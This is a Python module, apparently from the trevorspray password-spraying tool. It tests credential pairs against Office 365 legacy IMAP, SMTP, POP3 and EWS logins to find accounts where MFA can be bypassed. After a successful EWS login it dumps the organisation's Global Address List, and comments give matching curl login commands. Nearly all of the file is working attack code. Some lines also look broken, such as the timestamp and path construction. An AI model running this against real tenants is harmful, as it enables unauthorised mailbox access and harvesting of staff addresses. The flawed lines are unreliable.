import logging
from .base import Looter


log = logging.getLogger('trevorspray.looters.msol')


class MSOLLooter(Looter):

    def looter_legacy_auth(self):

        username,password = self.credential
        self.test_imap(username, password)
        self.test_smtp(username, password)
        self.test_pop(username, password)
        self.test_ews(username, password)


    def test_imap(self, username, password):

        log.info(f'Testing IMAP4 for {username}')
        from imaplib import IMAP4, IMAP4_SSL
        success = False

        # curl -v "imaps://outlook.office365.com:993/INBOX" --user "username:password"
        try:
            session = IMAP4_SSL('outlook.office365.com', 993)
            log.debug(session.welcome.decode())
            response = session.login(username, password)
            log.success(f'MFA bypass (IMAP) enabled for {username}!')
            success = True

        except IMAP4.error as e:
            log.warning(f'IMAP test failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing IMAP for {username}: {e}')

        return success


    def test_smtp(self, username, password):

        log.info(f'Testing SMTP for {username}')
        import smtplib
        success = False

        # curl -v "smtp://outlook.office365.com:587/INBOX" --user "user:password" --ssl
        # curl -v "smtp://smtp.office365.com:587/INBOX" --user "user:password" --ssl
        hosts = ['outlook.office365.com:587', 'smtp.office365.com:587']
        for host in hosts:
            try:
                session = smtplib.SMTP(host)
                log.debug(session.starttls())
                response = session.login(username, password)
                log.success(f'MFA bypass (SMTP) enabled for {username}!')
                success = True
                break

            except smtplib.SMTPException as e:
                log.warning(f'SMTP test failed for {username}: {e}')

            except Exception as e:
                if log.level <= logging.DEBUG:
                    import traceback
                    log.error(traceback.format_exc())
                else:
                    log.error(f'Unknown error while testing SMTP for {username}: {e}')

        return success

    def test_pop(self, username, password):

        log.info(f'Testing POP3 for {username}')
        import poplib
        success = False

        # curl -v "pop3s://outlook.office365.com:995/INBOX" --user "user:password"
        try:
            session = poplib.POP3_SSL('outlook.office365.com')
            log.debug(session.getwelcome())
            session.user(username)
            session.pass_(password)
            log.success(f'MFA bypass (POP3) enabled for {username}!')
            success = True

        except poplib.error_proto as e:
            log.warning(f'POP3 test failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing POP3 for {username}: {e}')

        return success


    def test_ews(self, username, password):

        log.info(f'Testing EWS for {username} (https://outlook.office365.com/EWS/Exchange.asmx)')
        import poplib
        import string
        import datetime
        import exchangelib
        success = False
        contacts_retrieved = 0

        # curl -v -H 'Content-Type: text/xml' https://outlook.office365.com/EWS/Exchange.asmx --user "BOB@EVILCORP.COM:Password123" --data-binary $'<?xml version=\'1.0\' encoding=\'utf-8\'?>\x0a<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"><s:Header><t:RequestServerVersion Version=\"Exchange2019\"/></s:Header><s:Body><m:ResolveNames ReturnFullContactData=\"false\"><m:UnresolvedEntry>BOB@EVILCORP.COM</m:UnresolvedEntry></m:ResolveNames></s:Body></s:Envelope>'
        try:
            credentials = exchangelib.Credentials(username, password)
            config = exchangelib.Configuration(service_endpoint='https://outlook.office365.com/EWS/Exchange.asmx', credentials=credentials)
            account = exchangelib.Account(primary_smtp_address=username, config=config, autodiscover=False, access_type=exchangelib.DELEGATE)
            log.success(f'MFA bypass (EWS) enabled for {username}!')
            success = True

            try:
                domain = username.split('@')[-1]
                filename = self.sprayer.trevor.home / datetime.now().strftime('%Y%m%d_%H%M%S') + f'{domain}_gal.txt'
                log.success(f'MFA bypass (EWS) enabled for {username}! Attempting to dump Global Address List')
                with open(str(filename), "a") as f:
                    for i in list(string.ascii_lowercase):
                        for mailbox, contact in account.protocol.resolve_names([i], return_full_contact_data=True):
                            f.write(mailbox.email_address + "\n")
                            contacts_retrieved += 1

            except exchangelib.errors.EWSError as e:
                log.warning(f'Failed to retrieve GAL for {domain}: {e}')

        except exchangelib.errors.EWSError as e:
            log.warning(f'EWS test failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing EWS for {username}: {e}')

        finally:
            if contacts_retrieved > 0:
                log.success(f'Successfully wrote {contacts_retrieved:,} emails to {filename}')